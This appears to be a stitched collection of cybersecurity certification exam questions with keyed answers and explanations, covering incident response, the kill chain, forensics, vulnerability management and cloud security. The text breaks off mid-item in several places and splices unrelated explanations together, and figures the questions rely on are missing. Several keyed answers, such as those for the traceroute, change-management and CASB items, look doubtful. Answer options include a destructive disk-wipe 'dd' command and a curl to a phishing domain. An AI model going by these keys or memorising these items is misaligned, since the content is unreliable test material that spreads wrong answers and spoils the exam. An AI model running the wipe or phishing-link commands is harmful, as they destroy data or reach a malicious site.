Which of the following best \ndescribes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?  \n  \nA. Weaponization  \nB. Reconnaissance  \nC. Delivery  \nD. Exploitation  \n  \nAnswer: D Explanation:  \nThe Cyber Kill Chain is a framework for understanding and responding to cyberattacks. It \ndescribes seven stages that an attacker must complete in order to successfully compromise a \nsystem.  \nIn this case, the malicious actor has already gained access to the internal network through social \nengineering. This means that the actor has completed the Reconnaissance and Delivery stages \n\n\n \nof the Cyber Kill Chain. The actor is now in the Exploitation stage, where they are attempting to \ngain control of the system.  \n  \n  \nQUESTION 34  \nAn analyst finds that an IP address outside of the company network that is being used to run \nnetwork and vulnerability scans across external-facing assets. Which of the following steps of an \nattack framework is the analyst witnessing?  \n  \nA. Exploitation  \nB. Reconnaissance  \nC. Command and control  \nD. Actions on objectives  \n  \nAnswer: B Explanation:  \nReconnaissance is the first step in most attack frameworks. It is the process of gathering \ninformation about a target in order to plan an attack. This information can include things like the \ntarget's network topology, IP addresses, and open ports.  \nIn this case, the analyst has found that an IP address outside of the company network is being \nused to run network and vulnerability scans across external-facing assets. This is a clear sign \nthat the IP address is being used for reconnaissance.  \n  \n  \nQUESTION 35  \nAn incident response analyst notices multiple emails traversing the network that target only the \nadministrators of the company. The email contains a concealed URL that leads to an unknown \nwebsite in another country. Which of the following best describes what is happening? (Choose \ntwo.)  \n  \nA. Beaconing  \nB. Domain Name System hijacking  \nC. Social engineering attack  \nD. On-path attack  \nE. Obfuscated links  \nF. Address Resolution Protocol poisoning  \n  \nAnswer: CE \nExplanation:  \nSocial engineering attack: This is a type of attack that relies on tricking the victim into clicking on \na malicious link or opening an attachment. In this case, the concealed URL in the email is likely a \nmalicious link that will lead the victim to a website that is controlled by the attacker. Once the \nvictim clicks on the link, the attacker can then install malware on the victim's computer or steal \ntheir personal information.  \nObfuscated links: This is a technique used to hide the true destination of a link. This can be done \nby using a variety of methods, such as using shortened URLs or encoding the URL in a way that \nmakes it difficult to read. In this case, the concealed URL in the email is likely obfuscated, which \nmakes it more difficult for the victim to identify as malicious.  \n  \n  \nQUESTION 36  \n\n\n \nDuring security scanning, a security analyst regularly finds the same vulnerabilities in a critical \napplication. Which of the following recommendations would best mitigate this problem if applied \nalong the SDLC phase?  \n  \nA. Conduct regular red team exercises over the application in production  \nB. Ensure that all implemented coding libraries are regularly checked  \nC. Use application security scanning as part of the pipeline for the CI/CD flow D. Implement \nproper input validation for any data entry form  \n  \nAnswer: C  \nExplanation:  \nApplication security scanning is a process that involves testing and analyzing applications for \nsecurity vulnerabilities, such as injection flaws, broken authentication, cross-site scripting, and \ninsecure configuration. Application security scanning can help identify and fix security issues \nbefore they become exploitable by attackers. Using application security scanning as part of the \npipeline for the continuous integration/continuous delivery (CI/CD) flow can help mitigate the \nproblem of finding the same vulnerabilities in a critical application during security scanning. This \nis because application security scanning can be integrated into the development lifecycle and \nperformed automatically and frequently as part of the CI/CD process.  \n  \n  \nQUESTION 37  \nAn analyst is reviewing a vulnerability report and must make recommendations to the executive \nteam. The analyst finds that most systems can be upgraded with a reboot resulting in a single \ndowntime window. However, two of the critical systems cannot be upgraded due to a vendor \nappliance that the company does not have access to. Which of the following inhibitors to \nremediation do these systems and associated vulnerabilities best represent?  \n  \nA. Proprietary systems  \nB. Legacy systems  \nC. Unsupported operating systems  \nD. Lack of maintenance windows  \n  \nAnswer: A Explanation:  \nProprietary systems are systems that are owned by their developer or vendor, and the company \ndoes not have access to the source code or other necessary information to upgrade or patch the \nsystem. This can make it difficult to remediate vulnerabilities in proprietary systems, as the \ncompany may need to rely on the vendor to provide a patch or update.  \nIn this case, the two critical systems cannot be upgraded due to a vendor appliance that the \ncompany does not have access to. This suggests that the systems are proprietary, and the \ncompany is unable to remediate the vulnerabilities without the vendor's assistance.  \n  \n  \nQUESTION 38  \nA company is in the process of implementing a vulnerability management program, and there are \nconcerns about granting the security team access to sensitive data. Which of the following \nscanning methods can be implemented to reduce the access to systems while providing the most \naccurate vulnerability scan results?  \n  \nA. Credentialed network scanning  \nB. Passive scanning  \nC. Agent-based scanning  \n\n\n \nD. Dynamic scanning  \n  \nAnswer: C Explanation:  \nAgent-based scanning is a method that involves installing software agents on the target systems \nor networks that can perform local scans and report the results to a central server or console. \nAgent- based scanning can reduce the access to systems, as the agents do not require any \ncredentials or permissions to scan the local system or network. Agent-based scanning can also \nprovide the most accurate vulnerability scan results, as the agents can scan continuously or \nondemand, regardless of the system or network status or location.  \n  \n  \nQUESTION 39  \nA security analyst is trying to identify anomalies on the network routing. Which of the following \nfunctions can the analyst use on a shell script to achieve the objective most accurately?  \n  \nA. function x() { info=$(geoiplookup $1) && echo \"$1 | $info\" }  \nB. function x() { info=$(ping -c 1 $1 | awk -F \"/\" 'END{print $5}') && echo \"$1 | $info\" }  \nC. function x() { info=$(dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F \".in-addr\" '{print $1} \n').origin.asn.cymru.com TXT +short) && echo \"$1 | $info\" }  \nD. function x() { info=$(traceroute -m 40 $1 | awk 'END{print $1}') && echo \"$1 | $info\" }  \n  \nAnswer: D Explanation:  \nThis shell function uses traceroute to trace the route packets take to reach the destination \nspecified by $1. The -m 40 option specifies a maximum of 40 hops for the trace. The awk \n'END{print $1}' part extracts the final hop from the traceroute output, and then the function \nechoes the destination and the info.  \n  \n  \nQUESTION 40  \nThere are several reports of sensitive information being disclosed via file sharing services. The \ncompany would like to improve its security posture against this threat. Which of the following \nsecurity controls would best support the company in this scenario?  \n  \nA. Implement step-up authentication for administrators  \nB. Improve employee training and awareness  \nC. Increase password complexity standards  \nD. Deploy mobile device management  \n  \nAnswer: B Explanation:  \nThe best security control to implement against sensitive information being disclosed via file \nsharing services is to improve employee training and awareness. Employee training and \nawareness can help educate employees on the risks and consequences of using file sharing \nservices for sensitive information, as well as the policies and procedures for handling such \ninformation securely and appropriately. Employee training and awareness can also help foster a \nsecurity culture and encourage employees to report any incidents or violations of information \nsecurity.  \n  \n  \nQUESTION 41  \nWhich of the following is the best way to begin preparation for a report titled \"What We Learned\" \nregarding a recent incident involving a cybersecurity breach?  \n  \n\n\n \nA. Determine the sophistication of the audience that the report is meant for  \nB. Include references and sources of information on the first page  \nC. Include a table of contents outlining the entire report  \nD. Decide on the color scheme that will effectively communicate the metrics  \n  \nAnswer: A Explanation:  \nThe best way to begin preparation for a report titled \"What We Learned\" regarding a recent \nincident involving a cybersecurity breach is to determine the sophistication of the audience that \nthe report is meant for. The sophistication of the audience refers to their level of technical \nknowledge, understanding, or interest in cybersecurity topics. Determining the sophistication of \nthe audience can help tailor the report content, language, tone, and format to suit their needs and \nexpectations. For example, a report for executive management may be more concise, high-level, \nand business- oriented than a report for technical staff or peers.  \n  \n  \nQUESTION 42  \nA security analyst is performing an investigation involving multiple targeted Windows malware \nbinaries. The analyst wants to gather intelligence without disclosing information to the attackers. \nWhich of the following actions would allow the analyst to achieve the objective?  \n  \nA. Upload the binary to an air gapped sandbox for analysis  \nB. Send the binaries to the antivirus vendor  \nC. Execute the binaries on an environment with internet connectivity  \nD. Query the file hashes using VirusTotal  \n  \nAnswer: A Explanation:  \nThe best action that would allow the analyst to gather intelligence without disclosing information \nto the attackers is to upload the binary to an air gapped sandbox for analysis. An air gapped \nsandbox is an isolated environment that has no connection to any external network or system. \nUploading the binary to an air gapped sandbox can prevent any communication or interaction \nbetween the binary and the attackers, as well as any potential harm or infection to other systems \nor networks. An air gapped sandbox can also allow the analyst to safely analyze and observe the \nbehavior, functionality, or characteristics of the binary.  \n  \n  \nQUESTION 43  \nWhich of the following would help to minimize human engagement and aid in process \nimprovement in security operations?  \n  \nA. OSSTMM  \nB. SIEM  \nC. SOAR  \nD. OWASP  \n  \nAnswer: C Explanation:  \nSOAR stands for security orchestration, automation, and response, which is a term that describes \na set of tools, technologies, or platforms that can help streamline, standardize, and automate \nsecurity operations and incident response processes and tasks. SOAR can help minimize human \nengagement and aid in process improvement in security operations by reducing manual work, \nhuman errors, response time, or complexity. SOAR can also help enhance collaboration, \ncoordination, efficiency, or effectiveness of security operations and incident response teams.  \n  \n\n\n \n  \nQUESTION 44  \nAfter conducting a cybersecurity risk assessment for a new software request, a Chief Information \nSecurity Officer (CISO) decided the risk score would be too high. The CISO refused the software \nrequest. Which of the following risk management principles did the CISO select?  \n  \nA. Avoid  \nB. Transfer  \nC. Accept  \nD. Mitigate  \n  \nAnswer: A Explanation:  \nAvoid is a risk management principle that describes the decision or action of not engaging in an \nactivity or accepting a risk that is deemed too high or unacceptable. Avoiding a risk can eliminate \nthe possibility or impact of the risk, as well as the need for any further risk management actions.  \nIn this case, the CISO decided the risk score would be too high and refused the software request. \nThis indicates that the CISO selected the avoid principle for risk management.  \n  \n  \nQUESTION 45  \nWhich of the following is an important aspect that should be included in the lessons-learned step \nafter an incident?  \n  \nA. Identify any improvements or changes in the incident response plan or procedures  \nB. Determine if an internal mistake was made and who did it so they do not repeat the error  \nC. Present all legal evidence collected and turn it over to iaw enforcement  \nD. Discuss the financial impact of the incident to determine if security controls are well spent  \n  \nAnswer: A Explanation:  \nAn important aspect that should be included in the lessons-learned step after an incident is to \nidentify any improvements or changes in the incident response plan or procedures. The lessons- \nlearned step is a process that involves reviewing and evaluating the incident response activities \nand outcomes, as well as identifying and documenting any strengths, weaknesses, gaps, or best \npractices. Identifying any improvements or changes in the incident response plan or procedures \ncan help enhance the security posture, readiness, or capability of the organization for future \nincidents.  \n  \n  \nQUESTION 46  \nThe security operations team is required to consolidate several threat intelligence feeds due to \nredundant tools and portals. Which of the following will best achieve the goal and maximize \nresults?  \n  \nA. Single pane of glass  \nB. Single sign-on  \nC. Data enrichment  \nD. Deduplication  \n  \nAnswer: A Explanation:  \nA single pane of glass (SPOG) is a security solution that aggregates data from multiple sources \ninto a single view. This allows security analysts to have a holistic view of their security posture \nand to quickly identify and respond to threats.  \n\n\n \nIn this case, a SPOG can be used to consolidate several threat intelligence feeds into a single \nview. This would allow the security operations team to have a single place to view all of their \nthreat intelligence data, which would help them to identify and respond to threats more quickly \nand efficiently.  \n  \n  \nQUESTION 47  \nWhich of the following would a security analyst most likely use to compare TTPs between \ndifferent known adversaries of an organization?  \n  \nA. MITRE ATT&CK  \nB. Cyber Kill Cham  \nC. OWASP  \nD. STIX/TAXII  \n  \nAnswer: A Explanation:  \nMITRE ATT&CK is a framework and knowledge base that describes the tactics, techniques, and \nprocedures (TTPs) used by various adversaries in cyberattacks. MITRE ATT&CK can help \nsecurity analysts compare TTPs between different known adversaries of an organization, as well \nas identify patterns, gaps, or trends in adversary behavior. MITRE ATT&CK can also help security \nanalysts improve threat detection, analysis, and response capabilities, as well as share threat \nintelligence with other organizations or communities.  \n  \n  \nQUESTION 48  \nThe security team reviews a web server for XSS and runs the following Nmap scan:  \n  \n  \n  \nWhich of the following most accurately describes the result of the scan?  \n  \nA.

This is the best technique to perform the analysis of a \nmalicious binary file, as it allows the analyst to see the code that the malware is actually running. \nThis can help the analyst to identify the malware's purpose, its capabilities, and how it spreads.  \n  \n  \nQUESTION 51  \nAn incident response team found IoCs in a critical server. The team needs to isolate and collect \ntechnical evidence for further investigation. Which of the following pieces of data should be \ncollected first in order to preserve sensitive information before isolating the server?  \n  \nA. Hard disk  \nB. Primary boot partition  \nC. Malicious files  \nD. Routing table  \nE. Static IP address  \n  \nAnswer: D Explanation:  \nEvidence capture prioritizes collection activities based on the order of volatility, initially focusing \non highly volatile storage. The ISOC best practice guide to evidence collection and archiving, \npublished as tools.ietf.org/html/rfc3227, sets out the general order as follows:  \nCPU registers and cache memory (including cache on disk controllers, GPUs, and so on) \nContents of system memory (RAM), including the following:  \nRouting table, ARP cache, process table, kernel statistics  \nTemporary file systems/swap space/virtual memory  \n\n\n \nData on persistent mass storage devices (HDDs, SSDs, and flash memory devices) - \nincluding file system and free space Remote logging and monitoring data  \nPhysical configuration and network topology  \nArchival media  \n  \n  \nQUESTION 52  \nWhich of the following security operations tasks are ideal for automation?  \n  \nA. Suspicious file analysis:  \nLook for suspicious-looking graphics in a folder.  \nCreate subfolders in the original folder based on category of graphics found.  \nMove the suspicious graphics to the appropriate subfolder  \nB. Firewall IoC block actions:  \nExamine the firewall logs for IoCs from the most recently published zero-day exploit  \nTake mitigating actions in the firewall to block the behavior found in the logs  \nFollow up on any false positives that were caused by the block rules  \nC. Security application user errors:  \nSearch the error logs for signs of users having trouble with the security application  \nLook up the user's phone number  \nCall the user to help with any questions about using the application  \nD. Email header analysis:  \nCheck the email header for a phishing confidence metric greater than or equal to five  \nAdd the domain of sender to the block list  \nMove the email to quarantine  \n  \nAnswer: D Explanation:  \nEmail header analysis is one of the security operations tasks that are ideal for automation. Email \nheader analysis involves checking the email header for various indicators of phishing or \nspamming attempts, such as sender address spoofing, mismatched domains, suspicious subject \nlines, or phishing confidence metrics. Email header analysis can be automated using tools or \nscripts that can parse and analyze email headers and take appropriate actions based on \npredefined rules or thresholds.  \n  \n  \nQUESTION 53  \nAn organization has experienced a breach of customer transactions. Under the terms of PCI \nDSS, which of the following groups should the organization report the breach to?  \n  \nA. PCI Security Standards Council  \nB. Local law enforcement  \nC. Federal law enforcement  \nD. Card issuer  \n  \nAnswer: D Explanation:  \nUnder the terms of PCI DSS, an organization that has experienced a breach of customer \ntransactions should report the breach to the card issuer. The card issuer is the financial institution \nthat issues the payment cards to the customers and that is responsible for authorizing and \nprocessing the transactions. The card issuer may have specific reporting requirements and \nprocedures for the organization to follow in the event of a breach. The organization should also \nnotify other parties that may be affected by the breach, such as customers, law enforcement, or \nregulators, depending on the nature and scope of the breach.   \n\n\n \n  \n  \nQUESTION 54  \nWhich of the following is the best metric for an organization to focus on given recent investments \nin SIEM, SOAR, and a ticketing system?  \n  \nA. Mean time to detect  \nB. Number of exploits by tactic  \nC. Alert volume  \nD. Quantity of intrusion attempts  \n  \nAnswer: A Explanation:  \nMean time to detect (MTTD) is the best metric for an organization to focus on given recent \ninvestments in SIEM, SOAR, and a ticketing system. MTTD is a metric that measures how long it \ntakes to detect a security incident or threat from the time it occurs. MTTD can be improved by \nusing tools and processes that can collect, correlate, analyze, and alert on security data from \nvarious sources. SIEM, SOAR, and ticketing systems are examples of such tools and processes \nthat can help reduce MTTD and enhance security operations.   \n  \n  \nQUESTION 55  \nA company is implementing a vulnerability management program and moving from an \nonpremises environment to a hybrid IaaS cloud environment. Which of the following implications \nshould be considered on the new hybrid environment?  \n  \nA. The current scanners should be migrated to the cloud  \nB. Cloud-specific misconfigurations may not be detected by the current scanners  \nC. Existing vulnerability scanners cannot scan IaaS systems  \nD. Vulnerability scans on cloud environments should be performed from the cloud  \n  \nAnswer: B Explanation:  \nCloud-specific misconfigurations are security issues that arise from improper or inadequate \nconfiguration of cloud resources, such as storage buckets, databases, virtual machines, or \ncontainers. Cloud-specific misconfigurations may not be detected by the current scanners that \nare designed for on-premises environments, as they may not have the visibility or access to the \ncloud resources or the cloud provider's APIs. Therefore, one of the implications that should be \nconsidered on the new hybrid environment is that cloud-specific misconfigurations may not be \ndetected by the current scanners.  \n  \n  \nQUESTION 56  \nA security alert was triggered when an end user tried to access a website that is not allowed per \norganizational policy. Since the action is considered a terminable offense, the SOC analyst \ncollects the authentication logs, web logs, and temporary files, reflecting the web searches from \nthe user's workstation, to build the case for the investigation. Which of the following is the best \nway to ensure that the investigation complies with HR or privacy policies?  \n  \nA. Create a timeline of events detailing the date stamps, user account hostname and IP information \nassociated with the activities  \nB. Ensure that the case details do not reflect any user-identifiable information Password protect the \nevidence and restrict access to personnel related to the investigation  \n\n\n \nC. Create a code name for the investigation in the ticketing system so that all personnel with access \nwill not be able to easily identify the case as an HR-related investigation  \nD. Notify the SOC manager for awareness after confirmation that the activity was intentional  \n  \nAnswer: B Explanation:  \nThe best way to ensure that the investigation complies with HR or privacy policies is to ensure \nthat the case details do not reflect any user-identifiable information, such as name, email \naddress, phone number, or employee ID. This can help protect the privacy and confidentiality of \nthe user and prevent any potential discrimination or retaliation. Additionally, password protecting \nthe evidence and restricting access to personnel related to the investigation can help preserve \nthe integrity and security of the evidence and prevent any unauthorized or accidental disclosure \nor modification.  \n  \n  \nQUESTION 57  \nWhich of the following is the first step that should be performed when establishing a disaster \nrecovery plan?  \n  \nA. Agree on the goals and objectives of the plan  \nB. Determine the site to be used during a disaster  \nC. Demonstrate adherence to a standard disaster recovery process  \nD. Identify applications to be run during a disaster  \n  \nAnswer: A Explanation:  \nThe first step that should be performed when establishing a disaster recovery plan is to agree on \nthe goals and objectives of the plan. The goals and objectives of the plan should define what the \nplan aims to achieve, such as minimizing downtime, restoring critical functions, ensuring data \nintegrity, or meeting compliance requirements. The goals and objectives of the plan should also \nbe aligned with the business needs and priorities of the organization and be measurable and \nachievable.  \n  \n  \nQUESTION 58  \nWhich of the following describes how a CSIRT lead determines who should be communicated \nwith and when during a security incident?  \n  \nA.

To build a network segmentation strategy  \n  \n\n\n \nAnswer: B  \nExplanation:  \nThreat intelligence comprises information gathered that does one of the following things:  \n Educates and warns you about potential dangers not yet seen in the environment  \n Identifies behavior that accompanies malicious activity  \n Alerts you of ongoing malicious activity  \n  \n  \nQUESTION 98  \nWhile conducting a cloud assessment, a security analyst performs a Prowler scan, which \ngenerates the following within the report:  \n  \n  \n  \nBased on the Prowler report, which of the following is the BEST recommendation?  \n  \nA. Delete CloudDev access key 1.  \nB. Delete BusinessUsr access key 1.  \nC. Delete access key 1. D. Delete access key 2.  \n  \nAnswer: B  \nExplanation:  \nThe only \"FAIL!\" in this report is BusinessUsr.  \n  \n  \nQUESTION 99  \nAn internally developed file-monitoring system identified the following except as causing a \nprogram to crash often:  \n  \nchar filedata[100];  fp = \nfopen(`access.log`, `r`);  \nsrtcopy (filedata, fp);  \nprintf (`%s\\n`, filedata);  \n  \nWhich of the following should a security analyst recommend to fix the issue?  \n  \nA. Open the access.log file in read/write mode.  \nB. Replace the strcpy function.  \nC. Perform input sanitization.  \nD. Increase the size of the file data butter.  \n  \nAnswer: B  \nExplanation:  \nUse of insecure functions can make it much harder to secure code.  \nFunctions like strcpy, which don't have critical security features built in, can result in code that is \neasier for attackers to target. In fact, strcpy is the only specific function that the CySA+ objectives \ncall out, likely because of how commonly it is used for buffer overflow attacks in applications \n\n\n \nwritten in C. strcpy allows data to be copied without caring whether the source is bigger than the \ndestination. If this occurs, attackers can place arbitrary data in memory locations past the original \ndestination, possibly allowing a buffer overflow attack to succeed.  \n  \n  \nQUESTION 100  \nAn organization has the following policy statements:  \n  \n- AlI emails entering or leaving the organization will be subject to inspection for malware, policy \nviolations, and unauthorized coolant.  \n- All network activity will be logged and monitored.  \n- Confidential data will be tagged and tracked  \n- Confidential data must never be transmitted in an unencrypted form.  \n- Confidential data must never be stored on an unencrypted mobile device.  \n  \nWhich of the following is the organization enforcing?  \n  \nA. Acceptable use policy  \nB. Data privacy policy  \nC. Encryption policy  \nD. Data management policy  \n  \nAnswer: D Explanation: https://www.comptia.org/newsroom/2020/02/25/data-management-\nfundamentals-are-the-firststep-towards-advanced-data-practices-new-comptia-report-reveals  \n  \n  \nQUESTION 101  \nA Chief Executive Officer (CEO) is concerned the company will be exposed lo data sovereignty \nissues as a result of some new privacy regulations to help mitigate this risk. The Chief \nInformation Security Officer (CISO) wants to implement an appropriate technical control. Which of \nthe following would meet the requirement?  \n  \nA. Data masking procedures  \nB. Enhanced encryption functions  \nC. Regular business impact analysis functions  \nD. Geographic access requirements  \n  \nAnswer: D Explanation:  \nData Sovereignty means that data is subject to the laws and regulations of the geographic \nlocation where that data is collected and processed. Data sovereignty is a country-specific \nrequirement that data must remain within the borders of the jurisdiction where it originated. At its \ncore, data sovereignty is about protecting sensitive, private data and ensuring it remains under \nthe control of its owner.  \n  \n  \nQUESTION 102  \nA security analyst needs to provide the development team with secure connectivity from the \ncorporate network to a three-tier cloud environment. The developers require access to servers in \nall three tiers in order to perform various configuration tasks. Which of the following technologies \nshould the analyst implement to provide secure transport?  \n  \nA. CASB  \n\n\n \nB. VPC  \nC. Federation  \nD. VPN  \n  \nAnswer: D  \nExplanation:  \nA VPN (Virtual Private Network) creates a secure and encrypted tunnel between the corporate \nnetwork and the cloud environment. This allows the development team to access servers in all \nthree tiers of the cloud environment securely, without exposing their traffic to the public internet.  \nThe other options are not as well-suited for this scenario:  \nCASB (Cloud Access Security Broker) is a security solution that monitors and controls traffic \nbetween the corporate network and cloud environments. CASBs can be used to enforce security \npolicies, such as preventing users from accessing unauthorized cloud resources. However, \nCASBs do not provide secure transport.  \nVPC (Virtual Private Cloud) is a network service that creates a logically isolated section of a cloud \nenvironment. VPCs can be used to improve security and performance by isolating traffic from \ndifferent workloads. However, VPCs do not provide secure transport between the corporate \nnetwork and the cloud environment.  \nFederation is a technology that allows users to log in to multiple applications using a single set of \ncredentials. Federation can be used to improve security and convenience for users. However, \nfederation does not provide secure transport.  \nIn conclusion, a VPN is the best technology to use to provide secure transport for the \ndevelopment team to access the cloud environment.  \n  \n  \nQUESTION 103  \nA security analyst found an old version of OpenSSH running on a DMZ server and determined \nthe following piece of code could have led to a command execution through an integer overflow;  \n  \n  \n  \nWhich of the following controls must be in place to prevent this vulnerability?  \n  \nA. Convert all integer numbers in strings to handle the memory buffer correctly.  \nB. Implement float numbers instead of integers to prevent integer overflows.  \nC. Use built-in functions from libraries to check and handle long numbers properly.  \nD. Sanitize user inputs, avoiding small numbers that cannot be handled in the memory.  \n  \nAnswer: C Explanation:  \nThe vulnerability in the code is an integer overflow, which happens when the size of a variable \nexceeds its maximum capacity. Attackers can exploit this vulnerability to execute arbitrary code, \nescalate privileges, or cause a denial of service. To prevent integer overflows, it is recommended \nto use built-in functions from libraries to check and handle long numbers properly. In this case, \nOpenSSH should be updated to the latest version, which includes patches to fix this vulnerability. \n\n\n \nAdditionally, it is good practice to use static analysis tools and perform code reviews to detect \nvulnerabilities before they are deployed to production.  \n  \n  \nQUESTION 104  \nA cyber-security analyst is implementing a new network configuration on an existing network \naccess layer to prevent possible physical attacks. Which of the following BEST describes a \nsolution that would apply and cause fewer issues during the deployment phase?  \n  \nA. Implement port security with one MAC address per network port of the switch.  \nB. Deploy network address protection with DHCP and dynamic VLANs.  \nC. Configure 802.1X and EAPOL across the network  \nD. Implement software-defined networking and security groups for isolation  \n  \nAnswer: A  \n  \n  \nQUESTION 105  \nA security analyst at example.com receives SIEM alert for an IDS signature and reviews the \nassociated packet capture and TCP stream:  \nPacket capture:  \n  \n  \n  \nTCP stream:  \n  \n  \n  \nWhich of the following actions should the security analyst take NEXT?  \n  \nA. Review the known Apache vulnerabilities to determine if a compromise actually occurred  \nB. Contact the application owner for connect.example.local for additional information.  \nC. Mark the alert as a false positive scan coming from an approved source.  \nD. Raise a request to the firewall team to block 203.0.113.15.  \n  \nAnswer: B Explanation:  \nAnytime we receive alerts/offenses that appears to be a potential scan (interna/external), we \nalready verify with the app owner/client if this was expected activity.  \nWe never close a ticket without confirmation, even its from an approved source.  \n  \n  \n\n\n \nQUESTION 106  \nA security analyst needs to provide a copy of a hard drive for forensic analysis.  Which \nof the following would allow the analyst to perform the task?  \n  \nA. dcfldd if=/dev/one of=/mnt/usb/evidence.bin hash=md5, sha1 \nhashlog=/mnt/usb/evidence.bin.hashlog  \nB. dd if=/dev/sda of=/mnt/usb/evidence.bin bs=4096; sha5l2sum /mnt/usb/evidence.bin > \n/mnt/usb/evidence.bin.hash  \nC. tar -zcf /mnt/usb/evidence.tar.gz / -except /mnt; sha256sum /mnt/usb/evidence.tar.gz > \n/mnt/usb/evidence.tar.gz.hash  \nD. find / -type f -exec cp {} /mnt/usb/evidence/ \\; sha1sum /mnt/usb/evidence/* > \n/mnt/usb/evidence/evidence.hash  \n  \nAnswer: B  \n  \n  \nQUESTION 107  \nWhile monitoring the information security notification mailbox, a security analyst notices several \nemails were reported as spam.

Which of the following should the analyst do to BEST mitigate future attacks?  \n  \nA. Implement MDM  \nB. Update the maiware catalog  \nC. Patch the mobile device's OS  \nD. Block third-party applications  \n  \nAnswer: A Explanation:  \nMDM solution to manage the configuration of those devices, automatically installing patches, \nrequiring the use of encryption, and providing remote wiping functionality. MDM solutions may \nalso restrict the applications that can be run on a mobile device to those that appear on an \napproved list.  \n  \n  \nQUESTION 142  \nSome hard disks need to be taken as evidence for further analysis during an incident response. \nWhich of the following procedures must be completed FIRST for this type of evidence \nacquisition?  \n  \nA. Extract the hard drives from the compromised machines and then plug them into a forensics \nmachine to apply encryption over the stored data to protect it from nonauthorized access.  \nB. Build the chain-of-custody document, noting the media model, serial number, size, vendor, \ndate, and time of acquisition.  \nC. Perform a disk sanitization using the command #dd if=/dev/zero of=/dev/sdc bs=1M over the \nmedia that will receive a copy of the collected data.  \nD. Execute the command #dd if-/dev/sda of=/dev/sdc bs=512 to clone the evidence data to \nexternal media to prevent any further change.  \n  \nAnswer: B Explanation:  \nChain of custody should be done before taking a copy of data, because this defines what tools \nwere used to obtain the data/who handled the copying. This is a crucial step for submitting data \nto court because this can help (along with hashing obv) prove the integrity of data.  \n  \n  \nQUESTION 143  \nWhich of the following is the software development process by which function, usability, and \nscenarios are tested against a known set of base requirements?  \n  \nA. Security regression testing  \nB. Code review  \nC. User acceptance testing  \n\n\n \nD. Stress testing  \n  \nAnswer: C Explanation:  \nUser Acceptance Testing - Beta testing by the end users that proves a program is usable and \nfitfor-purpose in real-world conditions.  \nStress Test - A stress test is used to determine what could trigger a denial of service.  \n  \n  \nQUESTION 144  \nAn organization wants to ensure the privacy of the data that is on its systems.

Implement file-level encryption of sensitive files  \nB. Reconfigure the FTP server to support FTPS  \nC. Run the FTP server n a chroot environment  \nD. Upgrade the FTP server to the latest version  \n  \nAnswer: C  \n\n\n \nExplanation:  \nPlace local users in a chroot jail based on their home directory.  \n  \n  \nQUESTION 150  \nA company offers a hardware security appliance to customers that provides remote \nadministration of a device on the customer's network. Customers are not authorized to alter the \nconfiguration. The company deployed a software process to manage unauthorized changes to \nthe appliance log them, and forward them to a central repository for evaluation.   \nWhich of the following processes is the company using to ensure the appliance is not altered \nfrom  \nits original configured state?  \n  \nA. CI/CD  \nB. Software assurance  \nC. Anti-tamper  \nD. Change management  \n  \nAnswer: D  \n  \n  \nQUESTION 151  \nA security analyst is investigating a reported phishing attempt that was received by many users \nthroughout the company. The text of one of the emails is shown below:  \n  \n  \n  \nDue to the size of the company and the high storage requirements, the company does not log \nDNS requests or perform packet captures of network traffic, but it does log network flow data. \nWhich of the following commands will the analyst most likely execute NEXT?  \n  \nA. telnet office365.com 25  \nB. tracert 122.167.40.119  \nC. curl http://accountfix-office365.com/login.php  \nD. nslookup accountfix-office365.com  \n  \n\n\n \nAnswer: D  \nExplanation:  \nA tracert would not help here on the investigation. Only a Lookup to know the IP would help.  \n  \n  \nQUESTION 152  \nA company's legal and accounting teams have decided it would be more cost-effective to offload \nthe risks of data storage to a third party. The IT management team has decided to implement a \ncloud model and has asked the security team for recommendations.  Which of the following will \nallow all data to be kept on the third-party network?  \n  \nA. VDI  \nB. SaaS  \nC. CASB  \nD. FaaS  \n  \nAnswer: C Explanation:  \nThe questions isn't asking which cloud model is to be used. It's asking which of the following \nchoices will ALLOW (give permission, authorization, unhindered access) to keep ALL DATA \n(could be PII or other sensitive data) on THIRD-PARTY NETWORK (Cloud Service Provider's \nNetwork). Assuming the IT Management team has chosen SaaS as their cloud model, this \ndoesn't mention how the data will be monitored, secured and other requirements to ensure the \ncompany is within compliance. What if the cloud provider is located in a location that doesn't \nallow specific data to be stored in that location? With a CASB deployed either locally or within the \ncloud the security team would be able to ensure policies are still enforced, monitor user activity, \nmaintain logs, etc. This means if you are in the US and for reasons you have data that contains \nPII on a citizen from another country that doesn't allow the US to maintain or collect that data, the \nCASB would be able to prevent that data from being stored. Staying in compliance and providing \nproper threat management allows all data to be kept on a third part network.  \n  \n  \nQUESTION 153  \nWhile reviewing web server logs, an analyst notices several entries with the same time stamps, \nbut all contain odd characters in the request line. Which of the following steps should be taken \nnext?  \n  \nA. Shut the network down immediately and call the next person in the chain of command.  \nB. Determine what attack the odd characters are indicative of.  \nC. Utilize the correct attack framework and determine what the incident response will consist of.  \nD. Notify the local law enforcement for incident response.  \n  \nAnswer: B Explanation:  \nDetermining what attack the odd characters are indicative of is the next step that should be taken \nafter reviewing web server logs and noticing several entries with the same time stamps, but all \ncontain odd characters in the request line. This step can help the analyst identify the type and \nseverity of the attack, as well as the possible source and motive of the attacker. The odd \ncharacters in the request line may indicate that the attacker is trying to exploit a vulnerability or \ninject malicious code into the web server or application, such as SQL injection, cross-site \nscripting, buffer overflow, or command injection. The analyst can use tools and techniques such \nas log analysis, pattern matching, signature detection, or threat intelligence to determine what \nattack the odd characters are indicative of, and then proceed to the next steps of incident \nresponse, such as containment, eradication, recovery, and lessons learned.  \n  \n\n\n \n  \nQUESTION 154  \nA security team conducts a lessons-learned meeting after struggling to determine who should \nconduct the next steps following a security event. Which of the following should the team create \nto address this issue?  \n  \nA. Service-level agreement  \nB. Change management plan  \nC. Incident response plan  \nD. Memorandum of understanding  \n  \nAnswer: C Explanation:  \nAn incident response plan (IRP) is a document that defines the roles and responsibilities, \nprocedures, and guidelines for responding to a security incident. It helps the security team to act \nquickly and effectively, minimizing the impact and cost of the incident. An IRP should specify who \nshould conduct the next steps following a security event, such as containment, eradication, \nrecovery, and analysis.  \n  \n  \nQUESTION 155  \nA cybersecurity analyst notices unusual network scanning activity coming from a country that the \ncompany does not do business with. Which of the following is the best mitigation technique?  \n  \nA. Geoblock the offending source country.  \nB. Block the IP range of the scans at the network firewall.  \nC. Perform a historical trend analysis and look for similar scanning activity.  \nD. Block the specific IP address of the scans at the network firewall.  \n  \nAnswer: A Explanation:  \nGeoblocking is a security measure that restricts or blocks access to a network based on \ngeographic location by analyzing IP 